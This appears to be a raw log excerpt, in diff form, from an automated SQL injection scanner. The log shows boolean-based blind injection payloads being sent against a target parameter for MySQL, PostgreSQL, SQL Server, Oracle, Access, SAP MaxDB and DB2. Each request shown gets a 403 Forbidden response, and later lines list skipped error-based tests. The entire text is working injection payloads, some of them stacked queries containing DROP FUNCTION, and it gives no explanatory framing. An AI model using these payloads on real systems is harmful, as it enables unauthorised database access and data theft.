+[08:20:11] [PAYLOAD] '  IIF(4973=4973,CHR(72)&CHR(117)&CHR(48)&CHR(82)&CHR(69)&CHR(100)&CHR(72)&CHR(52)&CHR(86)&CHR(54)&CHR(48)&CHR(81)&CHR(122)&CHR(108)&CHR(104)&CHR(104)&CHR(83)&CHR(98)&CHR(88)&CHR(83)&CHR(110)&CHR(114)&CHR(104)&CHR(87)&CHR(50)&CHR(116)&CHR(106)&CHR(112)&CHR(100)&CHR(56)&CHR(97)&CHR(51)&CHR(53)&CHR(50)&CHR(89)&CHR(122)&CHR(115)&CHR(49)&CHR(103)&CHR(97),1/0)-- -
+[08:20:12] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[08:20:12] [PAYLOAD] '  (CASE WHEN (7260=8826) THEN 7260 ELSE 7260*(SELECT 7260 FROM DUAL UNION SELECT 8826 FROM DUAL) END)-- -
+[08:20:13] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:13] [PAYLOAD] '  (CASE WHEN (4157=4157) THEN 4157 ELSE 4157*(SELECT 4157 FROM DUAL UNION SELECT 8413 FROM DUAL) END)-- -
+[08:20:14] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[08:20:14] [PAYLOAD] '  (CASE WHEN (6899=9526) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE 6899*(SELECT 6899 FROM DUAL UNION SELECT 9526 FROM DUAL) END)-- -
+[08:20:16] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:16] [PAYLOAD] '  (CASE WHEN (3103=3103) THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE 3103*(SELECT 3103 FROM DUAL UNION SELECT 8682 FROM DUAL) END)-- -
+[08:20:17] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:17] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[08:20:17] [PAYLOAD] '  (CASE WHEN 9335=8562 THEN 9335 ELSE NULL END)-- -
+[08:20:18] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:18] [PAYLOAD] '  (CASE WHEN 8850=8850 THEN 8850 ELSE NULL END)-- -
+[08:20:19] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:19] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[08:20:19] [PAYLOAD] '  (CASE WHEN 1545=3760 THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE NULL END)-- -
+[08:20:20] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:20] [PAYLOAD] '  (CASE WHEN 7753=7753 THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE NULL END)-- -
+[08:20:21] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:21] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:20:21] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (7430=9413) THEN 1 ELSE 7430*(SELECT 7430 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:20:22] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:22] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (9384=9384) THEN 1 ELSE 9384*(SELECT 9384 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:20:23] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:20:23] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (1468=7800) THEN 0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761 ELSE 1468*(SELECT 1468 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:20:24] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:24] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (1894=1894) THEN 0x4875305245644834563630517a6c6868536258536e72685732746a70643861333532597a73316761 ELSE 1894*(SELECT 1894 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:20:25] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:25] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[08:20:25] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (4998=8150) THEN 1 ELSE 1/(SELECT 0) END))-- -
+[08:20:27] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:27] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (4339=4339) THEN 1 ELSE 1/(SELECT 0) END))-- -
+[08:20:28] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:28] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[08:20:28] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (3908=9152) THEN (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) ELSE 1/(SELECT 0) END))-- -
+[08:20:29] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:29] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (4378=4378) THEN (CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97)) ELSE 1/(SELECT 0) END))-- -
+[08:20:30] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[08:20:30] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT * FROM GENERATE_SERIES(2755,2755,CASE WHEN (2755=1189) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:20:31] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:31] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT * FROM GENERATE_SERIES(6974,6974,CASE WHEN (6974=6974) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:20:32] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[08:20:32] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (9738=7668) THEN 1 ELSE 9738*(SELECT 9738 UNION ALL SELECT 7668) END))-- -
+[08:20:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:33] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (8625=8625) THEN 1 ELSE 8625*(SELECT 8625 UNION ALL SELECT 9951) END))-- -
+[08:20:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:34] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
+[08:20:34] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (3749=3570) THEN CHAR(72)+CHAR(117)+CHAR(48)+CHAR(82)+CHAR(69)+CHAR(100)+CHAR(72)+CHAR(52)+CHAR(86)+CHAR(54)+CHAR(48)+CHAR(81)+CHAR(122)+CHAR(108)+CHAR(104)+CHAR(104)+CHAR(83)+CHAR(98)+CHAR(88)+CHAR(83)+CHAR(110)+CHAR(114)+CHAR(104)+CHAR(87)+CHAR(50)+CHAR(116)+CHAR(106)+CHAR(112)+CHAR(100)+CHAR(56)+CHAR(97)+CHAR(51)+CHAR(53)+CHAR(50)+CHAR(89)+CHAR(122)+CHAR(115)+CHAR(49)+CHAR(103)+CHAR(97) ELSE 3749*(SELECT 3749 UNION ALL SELECT 3570) END))-- -
+[08:20:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:35] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (3212=3212) THEN CHAR(72)+CHAR(117)+CHAR(48)+CHAR(82)+CHAR(69)+CHAR(100)+CHAR(72)+CHAR(52)+CHAR(86)+CHAR(54)+CHAR(48)+CHAR(81)+CHAR(122)+CHAR(108)+CHAR(104)+CHAR(104)+CHAR(83)+CHAR(98)+CHAR(88)+CHAR(83)+CHAR(110)+CHAR(114)+CHAR(104)+CHAR(87)+CHAR(50)+CHAR(116)+CHAR(106)+CHAR(112)+CHAR(100)+CHAR(56)+CHAR(97)+CHAR(51)+CHAR(53)+CHAR(50)+CHAR(89)+CHAR(122)+CHAR(115)+CHAR(49)+CHAR(103)+CHAR(97) ELSE 3212*(SELECT 3212 UNION ALL SELECT 4582) END))-- -
+[08:20:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:36] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[08:20:36] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (1593=4319) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:37] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:37] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (3545=3545) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:39] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:20:39] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (2354=8898) THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:40] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT (CASE WHEN (2509=2509) THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:20:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:41] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
+[08:20:41] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,IIF(4714=2107,1,1/0)-- -
+[08:20:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:42] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,IIF(7878=7878,1,1/0)-- -
+[08:20:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:43] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:20:43] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,IIF(6579=3133,CHR(72)&CHR(117)&CHR(48)&CHR(82)&CHR(69)&CHR(100)&CHR(72)&CHR(52)&CHR(86)&CHR(54)&CHR(48)&CHR(81)&CHR(122)&CHR(108)&CHR(104)&CHR(104)&CHR(83)&CHR(98)&CHR(88)&CHR(83)&CHR(110)&CHR(114)&CHR(104)&CHR(87)&CHR(50)&CHR(116)&CHR(106)&CHR(112)&CHR(100)&CHR(56)&CHR(97)&CHR(51)&CHR(53)&CHR(50)&CHR(89)&CHR(122)&CHR(115)&CHR(49)&CHR(103)&CHR(97),1/0)-- -
+[08:20:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:44] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,IIF(5052=5052,CHR(72)&CHR(117)&CHR(48)&CHR(82)&CHR(69)&CHR(100)&CHR(72)&CHR(52)&CHR(86)&CHR(54)&CHR(48)&CHR(81)&CHR(122)&CHR(108)&CHR(104)&CHR(104)&CHR(83)&CHR(98)&CHR(88)&CHR(83)&CHR(110)&CHR(114)&CHR(104)&CHR(87)&CHR(50)&CHR(116)&CHR(106)&CHR(112)&CHR(100)&CHR(56)&CHR(97)&CHR(51)&CHR(53)&CHR(50)&CHR(89)&CHR(122)&CHR(115)&CHR(49)&CHR(103)&CHR(97),1/0)-- -
+[08:20:45] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:45] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
+[08:20:45] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(CASE WHEN 8082=6726 THEN 1 ELSE NULL END)-- -
+[08:20:46] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:46] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(CASE WHEN 1387=1387 THEN 1 ELSE NULL END)-- -
+[08:20:47] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:47] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:20:47] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(CASE WHEN 8796=2617 THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE NULL END)-- -
+[08:20:48] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:48] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(CASE WHEN 3451=3451 THEN 'Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ELSE NULL END)-- -
+[08:20:49] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:49] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
+[08:20:49] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT CASE WHEN 8349=9938 THEN 1 ELSE RAISE_ERROR(70001, CHR(80)||CHR(116)||CHR(85)||CHR(98)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:20:50] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:50] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT CASE WHEN 5437=5437 THEN 1 ELSE RAISE_ERROR(70001, CHR(111)||CHR(120)||CHR(106)||CHR(114)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:20:52] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:52] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
+[08:20:52] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT CASE WHEN 2791=3107 THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE RAISE_ERROR(70001, CHR(115)||CHR(67)||CHR(112)||CHR(121)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:20:53] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:53] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ,(SELECT CASE WHEN 8206=8206 THEN CHR(72)||CHR(117)||CHR(48)||CHR(82)||CHR(69)||CHR(100)||CHR(72)||CHR(52)||CHR(86)||CHR(54)||CHR(48)||CHR(81)||CHR(122)||CHR(108)||CHR(104)||CHR(104)||CHR(83)||CHR(98)||CHR(88)||CHR(83)||CHR(110)||CHR(114)||CHR(104)||CHR(87)||CHR(50)||CHR(116)||CHR(106)||CHR(112)||CHR(100)||CHR(56)||CHR(97)||CHR(51)||CHR(53)||CHR(50)||CHR(89)||CHR(122)||CHR(115)||CHR(49)||CHR(103)||CHR(97) ELSE RAISE_ERROR(70001, CHR(101)||CHR(75)||CHR(106)||CHR(106)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:20:54] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:54] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[08:20:54] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  HAVING 8143=3850-- -
+[08:20:55] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:55] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga'  HAVING 8014=8014-- -
+[08:20:56] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
+[08:20:56] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (8753=3929) THEN 8753 ELSE 8753*(SELECT 8753 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:20:57] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:57] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (4787=4787) THEN 4787 ELSE 4787*(SELECT 4787 FROM INFORMATION_SCHEMA.PLUGINS) END)-- -
+[08:20:58] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:58] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
+[08:20:58] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (2207=7686) THEN 2207 ELSE 1/(SELECT 0) END)-- -
+[08:20:59] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:20:59] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (4093=4093) THEN 4093 ELSE 1/(SELECT 0) END)-- -
+[08:21:00] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:00] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
+[08:21:00] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT * FROM GENERATE_SERIES(2652,2652,CASE WHEN (2652=6907) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:21:01] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:01] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT * FROM GENERATE_SERIES(7378,7378,CASE WHEN (7378=7378) THEN 1 ELSE 0 END) LIMIT 1-- -
+[08:21:02] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:02] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
+[08:21:02] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;IF(9557=7956) SELECT 9557 ELSE DROP FUNCTION qjOX-- -
+[08:21:04] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:04] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;IF(8700=8700) SELECT 8700 ELSE DROP FUNCTION RwtQ-- -
+[08:21:05] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:05] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
+[08:21:05] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (2360=8122) THEN 1 ELSE 2360*(SELECT 2360 UNION ALL SELECT 8122) END)-- -
+[08:21:06] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:06] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (7503=7503) THEN 1 ELSE 7503*(SELECT 7503 UNION ALL SELECT 4670) END)-- -
+[08:21:07] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:07] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
+[08:21:07] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (1439=6935) THEN 1439 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:21:08] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:08] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT (CASE WHEN (4482=4482) THEN 4482 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL-- -
+[08:21:09] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:09] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
+[08:21:09] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;IIF(9599=5463,1,1/0)-- -
+[08:21:10] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:10] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;IIF(4087=4087,1,1/0)-- -
+[08:21:11] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:11] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
+[08:21:11] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT CASE WHEN 7678=3511 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:21:12] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:12] [PAYLOAD] Hu0REdH4V60QzlhhSbXSnrhW2tjpd8a352Yzs1ga' ;SELECT CASE WHEN 8145=8145 THEN 1 ELSE NULL END FROM DUAL-- -
+[08:21:13] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 8.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 8.0 OR error-based - WHERE or HAVING clause (UUID_TO_BIN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.0 (inline) error-based - Table name clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL AND error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because user specified testing of only boolean-based blind techniques
